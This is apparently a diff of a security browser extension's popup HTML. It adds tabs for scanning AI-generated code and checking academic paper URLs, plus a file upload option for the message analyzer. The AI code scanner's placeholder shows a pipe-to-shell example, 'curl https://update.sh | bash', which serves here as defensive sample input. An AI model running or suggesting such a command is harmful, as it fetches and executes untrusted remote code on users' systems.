@@ -98,14 +98,20 @@
 
     <!-- Mode Selector Tabs -->
     <div class="popup-mode-bar">
-      <button id="tabLiveBtn" class="mode-tab active">
-        <span>🌐 Live Tab</span>
+      <button id="tabLiveBtn" class="mode-tab active" title="Active Tab Inspector">
+        <span>🌐 Live</span>
       </button>
-      <button id="tabScannerBtn" class="mode-tab">
-        <span>🔍 URL Scanner</span>
+      <button id="tabScannerBtn" class="mode-tab" title="URL & Phishing Scanner">
+        <span>🔍 Scanner</span>
       </button>
-      <button id="tabTextBtn" class="mode-tab">
-        <span>📧 Text Analyzer</span>
+      <button id="tabTextBtn" class="mode-tab" title="Email & SMS Social Engineering">
+        <span>📧 Text</span>
+      </button>
+      <button id="tabAiBtn" class="mode-tab" title="AI Code & Supply Chain Guard">
+        <span>🤖 AI Code</span>
+      </button>
+      <button id="tabScholarBtn" class="mode-tab" title="Academic Thesis & Journal Hijack Guard">
+        <span>🎓 Scholar</span>
       </button>
     </div>
 
@@ -328,8 +334,20 @@
         <div class="scanner-desc">Paste suspicious email body, SMS or chat message to detect social engineering:</div>
         
         <div class="quick-input-group" style="flex-direction: column; gap: 8px;">
-          <textarea id="textAnalyzerInput" class="quick-input" rows="3" style="width: 100%; height: 75px; resize: none; font-size: 11px; padding: 8px;" placeholder="Paste text here e.g. Urgent: Your account will be suspended within 24 hours unless you verify at http://paypa1.com"></textarea>
-          <button id="textScanBtn" class="btn btn-primary" style="width: 100%;">Analyze Message Text</button>
+          <textarea id="textAnalyzerInput" class="quick-input" rows="3" style="width: 100%; height: 75px; resize: none; font-size: 11px; padding: 8px;" placeholder="Paste text here or drop/upload file e.g. .eml, .txt, .pdf, .log..."></textarea>
+          
+          <div style="display: flex; gap: 6px; width: 100%;">
+            <input type="file" id="textFileInput" accept=".txt,.eml,.msg,.pdf,.doc,.docx,.html,.htm,.json,.csv,.log" style="display: none;">
+            <button type="button" id="textUploadBtn" class="btn btn-secondary" style="flex: 1; font-size: 11px; padding: 6px 10px; display: flex; align-items: center; justify-content: center; gap: 6px; background: rgba(59, 130, 246, 0.12); border: 1px dashed rgba(59, 130, 246, 0.4); color: #93C5FD; cursor: pointer;">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="17 8 12 3 7 8"/>
+                <line x1="12" y1="3" x2="12" y2="15"/>
+              </svg>
+              <span id="textUploadLabel">📁 Upload File</span>
+            </button>
+            <button id="textScanBtn" class="btn btn-primary" style="flex: 1; padding: 6px 10px; font-size: 11px;">Analyze Message</button>
+          </div>
         </div>
 
         <div class="sample-pills" style="margin-top: 6px;">
@@ -356,6 +374,84 @@
         <div class="quick-threats-box">
           <span class="q-findings-title">Identified Threat Signals:</span>
           <div id="textThreatsList" class="reasons-list"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 4: AI CODE & RESPONSE GUARD -->
+    <div id="aiSection" class="view-section">
+      <div class="scanner-card">
+        <div class="scanner-title">🤖 AI Code & Prompt Security Guard</div>
+        <div class="scanner-desc">Inspect AI-generated code or outputs for remote shell pipes, hallucinated packages & backdoors:</div>
+        
+        <div class="quick-input-group" style="flex-direction: column; gap: 8px;">
+          <textarea id="popupAiCodeInput" class="quick-input" rows="3" style="width: 100%; height: 75px; resize: none; font-size: 11px; padding: 8px;" placeholder="Paste AI code here e.g. curl https://update.sh | bash or pip install sys"></textarea>
+          <button id="popupAiScanBtn" class="btn btn-primary" style="width: 100%;">Scan AI Output</button>
+        </div>
+
+        <div class="sample-pills" style="margin-top: 6px;">
+          <span class="sample-label">Attack Tests:</span>
+          <button class="sample-btn popup-ai-sample" data-sample="pipe">Shell Pipe</button>
+          <button class="sample-btn popup-ai-sample" data-sample="hallucination">Hallucinated Pkg</button>
+          <button class="sample-btn popup-ai-sample" data-sample="safe">Safe Code</button>
+        </div>
+      </div>
+
+      <!-- AI Result Card -->
+      <div id="popupAiResult" class="scan-result-card" style="display: none;">
+        <div class="quick-header-row">
+          <div>
+            <span class="quick-res-title">AI Integrity Analysis:</span>
+            <div id="popupAiSummary" class="quick-res-host" style="font-size: 12px; font-weight: 700;">Analyzed Code Telemetry</div>
+          </div>
+          <div class="quick-res-score-badge">
+            <span id="popupAiScoreVal" class="quick-score-num">100</span>
+            <span id="popupAiScoreLabel" class="quick-score-pill status-safe">SAFE</span>
+          </div>
+        </div>
+
+        <div class="quick-threats-box">
+          <span class="q-findings-title">Identified Vulnerabilities:</span>
+          <div id="popupAiThreatsList" class="reasons-list"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 5: ACADEMIC THESIS & JOURNAL HIJACK GUARD -->
+    <div id="scholarSection" class="view-section">
+      <div class="scanner-card">
+        <div class="scanner-title">🎓 Academic Thesis & Journal Hijack Guard</div>
+        <div class="scanner-desc">Verify Google Scholar research paper URLs or DOIs to detect predatory cloned mirrors:</div>
+        
+        <div class="quick-input-group" style="flex-direction: column; gap: 8px;">
+          <input type="text" id="popupScholarInput" class="quick-input" placeholder="Paste Paper URL or DOI (e.g. 10.1109/...)">
+          <button id="popupScholarScanBtn" class="btn btn-primary" style="width: 100%;">Verify Paper Authenticity</button>
+        </div>
+
+        <div class="sample-pills" style="margin-top: 6px;">
+          <span class="sample-label">Scenarios:</span>
+          <button class="sample-btn popup-scholar-sample" data-sample="ieee-auth">Official IEEE</button>
+          <button class="sample-btn popup-scholar-sample" data-sample="ieee-hijack">🚨 Cloned Mirror</button>
+          <button class="sample-btn popup-scholar-sample" data-sample="arxiv">arXiv</button>
+        </div>
+      </div>
+
+      <!-- Scholar Result Card -->
+      <div id="popupScholarResult" class="scan-result-card" style="display: none;">
+        <div class="quick-header-row">
+          <div>
+            <span class="quick-res-title">Academic Authority Audit:</span>
+            <div id="popupScholarSummary" class="quick-res-host" style="font-size: 11px; font-weight: 700;">Host vs Registry Match</div>
+          </div>
+          <div class="quick-res-score-badge">
+            <span id="popupScholarScoreVal" class="quick-score-num">0</span>
+            <span id="popupScholarScoreLabel" class="quick-score-pill status-safe">AUTHENTIC</span>
+          </div>
+        </div>
+
+        <div class="quick-threats-box">
+          <span class="q-findings-title">Academic Security Audit:</span>
+          <div id="popupScholarThreatsList" class="reasons-list"></div>
         </div>
       </div>
     </div>
